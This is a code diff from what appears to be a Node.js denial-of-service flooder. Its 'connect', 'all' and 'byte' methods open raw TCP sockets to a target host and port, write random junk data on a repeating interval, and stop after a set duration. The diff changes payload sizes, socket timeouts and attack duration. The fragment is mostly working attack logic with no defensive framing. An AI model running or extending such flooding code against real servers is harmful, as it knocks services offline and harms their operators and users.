@@ -41,10 +41,10 @@ if (method == "connect"){
         setTimeout(function () {
             client.destroy();
             return delete client;
-        }, 500000);
+        }, 5000);
     })
 	});
-	setTimeout(() => clearInterval(int), time * 10);
+	setTimeout(() => clearInterval(int), time * 1000);
 }
 
 if (method == "all"){
@@ -57,7 +57,7 @@ if (method == "all"){
     var client = new net.Socket();
 	client.connect(port, host, function() {
 		for (var i = 0; i < 5; i++) {
-			client.write(makeid(100000));
+			client.write(makeid(1000));
     	}
     	client.write(makeid(50000));
 	client.destroy();
@@ -83,7 +83,7 @@ if (method == "byte"){
 	client.connect(port, host, function() {
 		client.setTimeout(10000)
 		for (var i = 0; i < 5; i++) {
-			client.write(makeid(100000));
+			client.write(makeid(1000));
     	}
 		client.destroy();
 	});
@@ -94,7 +94,7 @@ if (method == "byte"){
         }, 5000);
     })
 	});
-	setTimeout(() => clearInterval(int), time * 10);
+	setTimeout(() => clearInterval(int), time * 1000);
 }
 
 
